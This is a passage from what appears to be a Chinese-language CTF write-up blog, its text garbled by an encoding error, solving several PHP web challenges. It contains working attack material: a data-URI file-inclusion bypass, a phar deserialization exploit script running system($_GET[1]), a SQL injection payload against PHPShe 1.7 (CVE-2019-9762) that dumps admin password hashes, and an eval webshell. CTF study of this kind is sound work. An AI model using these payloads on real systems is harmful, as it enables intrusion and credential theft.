&lt;span style="color:#111">$mkdir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;mkdir -- &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// å®šä¹‰å‡½æ•°$mkdir() è°ƒç”¨ç³»ç»Ÿå‡½æ•°mkdir
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">$randFolder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// éšæœºå­—ç¬¦ä¸²
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;users/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$randFolder&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å½“å‰ç›®å½•ä¸‹åˆ›å»ºå­ç›®å½•users/randFolder
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;users/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$randFolder&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$userFolder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// å¯ä»¥è‡ªå®šä¹‰å­˜å‚¨è·¯å¾„
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$userFolder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">basename&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;-&amp;#39;&lt;/span>&lt;span style="color:#111">],[&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$userFolder&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// æ›¿æ¢`.`å’Œ`-`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">$mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$userFolder&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// åˆ›å»ºå­ç›®å½•å¹¶è½¬åˆ°å­ç›®å½•ä¸­
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$userFolder&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;profile&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// å†™å…¥å†…å®¹ æ–‡ä»¶åä¸ºprofile
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å›žåˆ°users/randFolder
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// è¿‡æ»¤`.`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]),&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]),&lt;/span>&lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶å†…å®¹ä¸èƒ½æœ‰&amp;lt;?å’Œphp
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;page&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶åŒ…å«ç‚¹
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__DIR__&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å›žåˆ°å½“å‰ç›®å½•
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf users/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$randFolder&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// åˆ é™¤users/randFolderåŠå…¶å­ç›®å½•
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è‡ªå·±ç¬¬ä¸€éçœ‹çš„æ—¶å€™æ²¡æ˜Žç™½ç¬¬ä¸€å¥å•¥æ„æ€ï¼ŒåŽŸæ¥ç¬¬ä¸€å¥çš„æ„æ€æ˜¯banäº†phpæµï¼Œç¡®å®žæŒºç‹ çš„ï¼›äº®ç‚¹æœ‰å‡ ä¸ªï¼Œé¦–å…ˆæ˜¯è°ƒç”¨ç³»ç»Ÿçº§çš„&lt;code>mkdir&lt;/code>å’Œ&lt;code>rm&lt;/code>å‘½ä»¤ï¼Œå°±éžå¸¸æœ‰å¯ä»¥ç»•è¿‡çš„ç©ºé—´ï¼ˆä½†æœ€åŽè€ƒçš„åœ°æ–¹ä¹Ÿä¸åœ¨è¿™ï¼‰ï¼Œå¦å¤–é‚£ä¸ª&lt;code>file_put_contents&lt;/code>æ–‡ä»¶çš„å†…å®¹æˆ‘ä»¬å¯æŽ§ï¼Œå› ä¸ºæ˜¯æ•´ä¸ª&lt;code>$_SERVER&lt;/code>æ•°ç»„ï¼ˆå¯ä»¥æŠŠæˆ‘ä»¬çš„ä»£ç å†™åˆ°ä»»æ„httpè¯·æ±‚å¤´ä¸­ï¼‰ï¼Œè¿˜æœ‰åŽé¢çš„&lt;code>include&lt;/code>æ–‡ä»¶åŒ…å«ç‚¹ä¸å…è®¸å†…å®¹æœ‰&lt;code>&amp;lt;?&lt;/code>å’Œ&lt;code>php&lt;/code>ï¼ˆéœ€è¦ç»•è¿‡è¿™ä¸ªæ£€æµ‹ï¼‰ï¼›æ®è¯´åŽé¢æœ‰phpinfo.phpçš„æç¤ºè¯´&lt;code>allow_url_fopen=On&lt;/code> &lt;code>allow_url_include=Off&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œåˆ©ç”¨çš„ç‚¹æ˜¯&lt;code>include&lt;/code>ä¸Ž&lt;code>file_get_contents&lt;/code>åœ¨å¤„ç†Data URIä¸Šçš„é—®é¢˜ã€‚ä»–ä»¬éƒ½æ”¯æŒ&lt;code>data:text/vnd-example+xyz;foo=bar;base64,R0lGODdh&lt;/code>è¿™æ ·çš„å†…å®¹ï¼ˆè€Œä¸æ˜¯&lt;code>data://&lt;/code>æµï¼ï¼‰ï¼Œè¿˜æ¯”å¦‚&lt;code>data:image/jpeg;base64,xxx&lt;/code>è¿™æ ·çš„å›¾ç‰‡ç­‰ç­‰ï¼Œä½†æ˜¯æœ‰ä¸€äº›é—®é¢˜ï¼Œ&lt;code>file_get_contents&lt;/code>å…è®¸ä½¿ç”¨data URIï¼Œä¼šç›´æŽ¥è¿”å›žåŽé¢çš„å†…å®¹ï¼Œå½“&lt;code>allow_url_include=Off&lt;/code>æƒ…å†µä¸‹ä¸å…è®¸include data URIï¼Œä½†å¦‚æžœå½“&lt;code>data:,xxx&lt;/code>æ˜¯ä¸€ä¸ªç›®å½•åçš„è¯å°±ä¼šæ”¾å¼€è¿™ä¸ªé™åˆ¶ï¼ˆè¿”å›žxxx è€Œä¸æ˜¯æ–‡ä»¶å†…å®¹ï¼‰&lt;/p>
&lt;p>åªè¦æŠŠxffå¤´æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶åï¼Œç„¶åŽéšä¾¿ä¸€ä¸ªå‚æ•°åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼ˆåœ¨$_SERVERSæ•°ç»„ä¸­ï¼‰ï¼Œå†è®©pageå‚æ•°è®¾ä¸º&lt;code>data:amiz/profile&lt;/code>ï¼Œåšåˆ°&lt;code>file_get_contents&lt;/code>ä¸è®¤ ä½†æ˜¯includeè®¤ï¼Œå¯ä»¥è®©å®ƒç›´æŽ¥åŒ…å«è¿™ä¸ªæ–‡ä»¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211153020891.png" alt="image-20211211153020891">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211153240826.png" alt="image-20211211153240826">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ha1c9on.top/2020/05/13/phuck2/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2020 æ€»å†³èµ›]Game Exp
&lt;/h4>
&lt;/summary>
&lt;p>ç»™äº†æºç ï¼Œéžå¸¸å¤šï¼Œç»“åˆé¡µé¢åŠŸèƒ½çœ‹ä»£ç ï¼›é¦–å…ˆæ˜¯æ³¨å†Œï¼Œæœ‰ä¸ªå¾ˆå¥‡æ€ªçš„å•ç‹¬çš„ç±»&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119001928719.png" alt="image-20220119001928719">&lt;/p>
&lt;p>å¾ˆæ˜¾ç„¶éœ€è¦ä¸€ä¸ªååºåˆ—åŒ–ç‚¹è§¦å‘AnyClassçš„&lt;code>eval()&lt;/code>ï¼Œç»“åˆæ³¨å†Œåœ°æ–¹ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹+&lt;code>file_exists&lt;/code>å‡½æ•°ï¼Œå¾ˆæ˜¾ç„¶æ˜¯pharååºåˆ—åŒ–äº†ï¼Œè€Œpharæœ¬æ¥å°±å¯¹åŽç¼€åä¸æ•æ„Ÿï¼ˆä¸»è¦çœ‹å†…å®¹ï¼‰ï¼Œæ‰€ä»¥ç›´æŽ¥ç”¨phar.jpgå³å¯ï¼Œ&lt;code>$filename&lt;/code>æ˜¯æ‹¼æŽ¥çš„ç”¨æˆ·åå’ŒåŽç¼€&lt;/p>
&lt;p>exp.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">AnyClass&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#111">$output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;echo &amp;#34;ok&amp;#34;;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">output&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">AnyClass&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system($_GET[1]);&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æ³¨æ„è¿™é‡Œæ˜¯å•å¼•å·
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exp.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¿®æ”¹åŽç¼€å’ŒMIMEä¸Šä¼ ï¼Œè·¯å¾„æ˜¯/login/amiz.jpgï¼ˆæ˜¯ç”¨æˆ·å&lt;/p>
&lt;p>å†å›žåˆ°æ³¨å†Œä¸Šä¼ é‚£é‡Œï¼Œä¿®æ”¹ç”¨æˆ·åä¸º&lt;code>php://amiz&lt;/code>ï¼Œç„¶åŽGETå‚æ•°è§¦å‘shellå³å¯&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[RoarCTF 2019]PHPShe
&lt;/h4>
&lt;/summary>
&lt;p>é™„ä»¶é‡Œæœ‰&lt;code>.idea&lt;/code>ï¼Œç»™äº†ä¸€äº›æç¤ºï¼Œæ˜¯1.7ç‰ˆæœ¬çš„phpsheï¼Œæœ‰&lt;a href="https://anquan.baidu.com/article/697">ä¸¤ä¸ªå·²çŸ¥çš„cve&lt;/a>ï¼Œä¸è¿‡xxeé‚£ä¸ªå› ä¸ºä¸å­˜åœ¨å¯¹åº”çš„phpæ–‡ä»¶ï¼Œæ‰€ä»¥ç”¨sqlé‚£ä¸ªcve-2019-9762ï¼Œä¸‹é¢è·Ÿä¸€ä¸‹åˆ†æžçš„è¿‡ç¨‹&lt;/p>
&lt;p>åœ¨include/function/global.func.phpä¸‹æœ‰é’ˆå¯¹æ•°æ®åº“å®‰å…¨çš„å‡½æ•°&lt;code>pe_dbhold()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119152726454.png" alt="image-20220119152726454">&lt;/p>
&lt;p>å‚æ•°ä¼šè¢«&lt;code>addslashes&lt;/code>å¤„ç†ï¼Œæˆ‘ä»¬çš„å¼•å·å’Œåæ–œæ ä¸ä¿ï¼Œé‚£çœ‹çœ‹æœ‰æ²¡æœ‰ä¸ç”¨å¼•å·ä¹Ÿå¯ä»¥æ³¨å…¥çš„åœ°æ–¹æˆ–è€…æ˜¯å®½å­—èŠ‚æ³¨å…¥&lt;/p>
&lt;p>åœ¨include/plugin/payment/alipay/pay.phpä¸­å¯¹&lt;code>$order_id&lt;/code>å‚æ•°è¿›è¡Œäº†è¿™æ ·çš„å¤„ç†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153255328.png" alt="image-20220119153255328">&lt;/p>
&lt;p>å…¶ä¸­å¥‡å¥‡æ€ªæ€ªçš„&lt;code>$_g_id&lt;/code>æ˜¯å¯¹postå‚æ•°çš„é‡å‘½åï¼Œåœ¨common.phpä¸­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153357784.png" alt="image-20220119153357784">&lt;/p>
&lt;p>ç”¨åˆ°äº†&lt;code>extract&lt;/code>å¯¹å˜é‡åå‰é¢åŠ ä¸Š&lt;code>_g_&lt;/code>æˆ–&lt;code>_p_&lt;/code>çš„å‰ç¼€&lt;/p>
&lt;p>å›žåˆ°ä¸Šé¢ï¼Œgetæ–¹å¼ä¼ å…¥çš„idå‚æ•°å…ˆç»è¿‡&lt;code>pe_dbhold&lt;/code>å¤„ç†åŽèµ‹å€¼ç»™&lt;code>$order_id&lt;/code>ï¼ŒéšåŽè¿›å…¥&lt;code>order_table&lt;/code>å‡½æ•°ï¼Œä½äºŽhook/order.hook.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119153634436.png" alt="image-20220119153634436">&lt;/p>
&lt;p>å¦‚æžœä¼ å…¥çš„å‚æ•°å«æœ‰&lt;code>_&lt;/code>ï¼Œåˆ™ä¼šä»¥å®ƒä¸ºåˆ†éš”ç¬¦ï¼Œè¿”å›ž&lt;code>order_&lt;/code>+&lt;code>_&lt;/code>å‰çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå¦‚æžœå‚æ•°ä¸å«&lt;code>_&lt;/code>ç›´æŽ¥è¿”å›žorder&lt;/p>
&lt;p>å†å›žåˆ°å‰é¢çš„&lt;code>pe_select&lt;/code>ï¼Œä½äºŽinclude/class/db.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119154502441.png" alt="image-20220119154502441">&lt;/p>
&lt;p>è¿™ä¸å·§äº†ï¼Œå‚æ•°éƒ¨åˆ†ç”¨çš„æ˜¯åå¼•å·è€Œä¸æ˜¯å•å¼•å·ï¼Œä¼ å…¥çš„&lt;code>$order_id&lt;/code>å°±æ˜¯è¿™é‡Œçš„&lt;code>$table&lt;/code>éƒ¨åˆ†ï¼Œ&lt;code>dbpre&lt;/code>æ˜¯æ•°æ®åº“è¡¨å‰ç¼€ï¼›æž„é€ è¿™æ ·çš„payload&lt;/p>
&lt;pre tabindex="0">&lt;code>pay` where 1=1 and sleep(5)%23_
&lt;/code>&lt;/pre>&lt;p>ç»è¿‡&lt;code>order_table&lt;/code>å’Œ&lt;code>pe_select&lt;/code>ä¹‹åŽæ˜¯è¿™æ ·çš„è¯­å¥&lt;/p>
&lt;pre tabindex="0">&lt;code>select * from `order_pay` where 1=1 and sleep(5)#` where `order_id` = `pay` where 1=1 and sleep(5)#_ limit 1
&lt;/code>&lt;/pre>&lt;p>ç„¶åŽæ‰¾åˆ©ç”¨ç‚¹ï¼Œåœ¨include/plugin/payment/alipay/pay.phpä¸­æœ‰åˆ©ç”¨ç‚¹å¹¶ä¸”æœ‰å›žæ˜¾ä½ï¼›å› ä¸ºå¯¹&lt;code>_&lt;/code>çš„ç‰¹æ®Šå¤„ç†ï¼Œæˆ‘ä»¬æ— æ³•ç”¨&lt;code>information_schema&lt;/code>æ¥æŸ¥è¡¨ï¼Œæ‰€ä»¥åªèƒ½åœ¨ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1
&lt;/code>&lt;/pre>&lt;p>æž„é€ payload&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°adminå¯†ç çš„md5å€¼ï¼ŒæŸ¥ä¸€ä¸‹å¾—åˆ°&lt;code>altman777&lt;/code>ï¼Œåœ¨/admin.phpå¤„ç™»å…¥åŽå°&lt;/p>
&lt;p>é¦–å…ˆåœ¨å“ç‰Œç®¡ç†å¤„å¯ä»¥ä¸Šä¼ æ–‡ä»¶&lt;/p>
&lt;p>å€ŸåŠ©.ideaç»™å‡ºçš„æç¤ºï¼Œåœ¨include/class/pclzip.class.phpæœ‰ä¸ªæ¯”å®˜æ–¹æ–‡ä»¶å¤šå‡ºæ¥çš„&lt;code>__destruct&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119161251378.png" alt="image-20220119161251378">&lt;/p>
&lt;p>è¿˜æœ‰è‡ªå¸¦çš„&lt;code>__construct&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119161950386.png" alt="image-20220119161950386">&lt;/p>
&lt;p>è¿˜æœ‰ä¸ªæ‰“å¼€çš„module/admin/moban.phpå’Œinclude/function/global.func.phpï¼Œåœ¨&lt;code>down&lt;/code>æ“ä½œä¸­å®žä¾‹åŒ–ä¸Šé¢çš„&lt;code>PclZip&lt;/code>ç±»ï¼Œä¹‹åŽç”¨&lt;code>extract()&lt;/code>æ¥è§£åŽ‹zipæ–‡ä»¶ï¼Œ&lt;code>$moban_template&lt;/code>æ˜¯æ–‡ä»¶è·¯å¾„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162417889.png" alt="image-20220119162417889">&lt;/p>
&lt;p>åœ¨&lt;code>del&lt;/code>æ“ä½œä¸­è°ƒç”¨&lt;code>pe_dirdel&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162704144.png" alt="image-20220119162704144">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119162714647.png" alt="image-20220119162714647">&lt;/p>
&lt;p>æœ‰ä¸ª&lt;code>is_file($dir_path)&lt;/code>å¯ä»¥è§¦å‘ååºåˆ—åŒ–&lt;/p>
&lt;p>ç»“åˆä¸Šé¢çš„&lt;code>__destruct&lt;/code>ä¸­çš„&lt;code>extract&lt;/code>ï¼Œè‚¯å®šæ˜¯pharååºåˆ—åŒ–äº†ï¼Œåœ¨å‰é¢ä¸Šä¼ çš„åœ°æ–¹ä¸Šä¼ åŽ‹ç¼©è¿‡çš„webshellï¼Œç„¶åŽå†ä¼ å…¥pharï¼Œé‡Œé¢å‚æ•°çš„è·¯å¾„æŒ‡å‘å‰é¢çš„zipè·¯å¾„ï¼Œè¢«ååºåˆ—åŒ–åŽè§¦å‘&lt;code>__destruct&lt;/code> è§£åŽ‹zipåˆ°ä¸€ä¸ªå¯è¯»å†™ç›®å½•/var/www/html/dataä¸­&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php eval($_POST['amiz']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;a href="http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip">http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class PclZip{
var $zipname = '';
var $zip_fd = 0;
var $error_code = 1;
var $error_string = '';
var $magic_quotes_status;
var $save_path = '/var/www/html/data';//è§£åŽ‹ç›®å½•
function __construct($p_zipname){
$this-&amp;gt;zipname = $p_zipname;
$this-&amp;gt;zip_fd = 0;
$this-&amp;gt;magic_quotes_status = -1;
return;
}
}
